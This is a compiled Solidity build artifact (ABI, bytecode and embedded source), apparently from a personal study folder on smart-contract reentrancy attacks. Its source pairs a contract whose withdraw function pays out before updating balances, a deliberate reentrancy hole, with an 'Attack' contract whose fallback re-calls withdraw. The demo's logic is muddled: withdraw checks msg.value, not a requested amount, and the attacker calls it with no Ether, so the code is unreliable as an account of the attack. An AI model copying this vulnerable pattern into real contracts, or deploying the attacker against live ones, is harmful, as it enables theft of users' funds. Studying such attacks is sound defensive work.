{
  "contractName": "Attack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "_mycontract",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "mycontract",
      "outputs": [
        {
          "internalType": "contract Mycontract",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "depositIn",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "sendETH",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516106113803806106118339818101604052810190610032919061008d565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600081519050610087816100f1565b92915050565b6000602082840312156100a3576100a26100ec565b5b60006100b184828501610078565b91505092915050565b60006100c5826100cc565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600080fd5b6100fa816100ba565b811461010557600080fd5b50565b6104fa806101176000396000f3fe60806040526004361061004e5760003560e01c806321b1e5f8146100d15780634cd2270c146100ed578063722713f7146100f757806377ccfb1e146101225780639e5faafc1461014d5761004f565b5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100b757600080fd5b505af11580156100cb573d6000803e3d6000fd5b50505050005b6100eb60048036038101906100e691906102cc565b610157565b005b6100f5610207565b005b34801561010357600080fd5b5061010c610209565b60405161011991906103ad565b60405180910390f35b34801561012e57600080fd5b50610137610211565b6040516101449190610372565b60405180910390f35b610155610235565b005b60008173ffffffffffffffffffffffffffffffffffffffff163460405161017d9061035d565b60006040518083038185875af1925050503d80600081146101ba576040519150601f19603f3d011682016040523d82523d6000602084013e6101bf565b606091505b5050905080610203576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101fa9061038d565b60405180910390fd5b5050565b565b600047905090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561029d57600080fd5b505af11580156102b1573d6000803e3d6000fd5b50505050565b6000813590506102c6816104ad565b92915050565b6000602082840312156102e2576102e1610456565b5b60006102f0848285016102b7565b91505092915050565b61030281610420565b82525050565b60006103156021836103d3565b91506103208261045b565b604082019050919050565b60006103386000836103c8565b9150610343826104aa565b600082019050919050565b61035781610416565b82525050565b60006103688261032b565b9150819050919050565b600060208201905061038760008301846102f9565b92915050565b600060208201905081810360008301526103a681610308565b9050919050565b60006020820190506103c2600083018461034e565b92915050565b600081905092915050565b600082825260208201905092915050565b60006103ef826103f6565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061042b82610432565b9050919050565b600061043d82610444565b9050919050565b600061044f826103f6565b9050919050565b600080fd5b7f7472616e73616374696f6e2063616e206e6f742062652073756363657373667560008201527f6c00000000000000000000000000000000000000000000000000000000000000602082015250565b50565b6104b6816103e4565b81146104c157600080fd5b5056fea26469706673582212206a42803bdaebf01d74a7290196c59aea9a997f0baf1f739619520eac0f37ad3164736f6c63430008070033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity >=0.4.0 < 0.9.0;\n\n\ncontract Mycontract{\n    \n    mapping(address =>uint) public balances;\n    \n    function deposit() external payable{\n        balances[msg.sender] += msg.value;\n    }\n    fallback() external payable{\n        balances[msg.sender] += msg.value;\n    }\n    function balanceOf() public view returns(uint){\n        return address(this).balance;\n    }\n    \n    function withdraw()payable public{\n        if(msg.value <= balances[msg.sender]){\n            payable(msg.sender).call{value:msg.value}(\"\");\n            balances[msg.sender] -= msg.value;\n        }\n        \n    }\n}\n\n contract Attack{\n    \n     Mycontract public mycontract;\n    \n     constructor(address payable _mycontract){\n         mycontract = Mycontract(_mycontract);\n     }\n    \n    //  function get() public view returns(address){\n    //      return mycontract;\n    //  }\n\n     fallback()external payable{\n         mycontract.withdraw();\n     }\n\n    function attack() external payable{\n        mycontract.withdraw();\n    }\n     function depositIn()external payable{}\n\n     function balanceOf() public view returns(uint){\n        return address(this).balance;\n    }\n    \n    function sendETH(address payable _addr)public payable{\n         (bool sent,) = _addr.call{value:msg.value}(\"\");\n         require(sent,'transaction can not be successful');\n     }\n    \n    \n }",
  "sourcePath": "/home/aduttya/Documents/smartContractAttacks/reentracy/contracts/reentracy.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.7+commit.e28d00a7.Emscripten.clang"
  },
  "schemaVersion": "3.4.3",
  "updatedAt": "2021-09-25T04:49:35.223Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}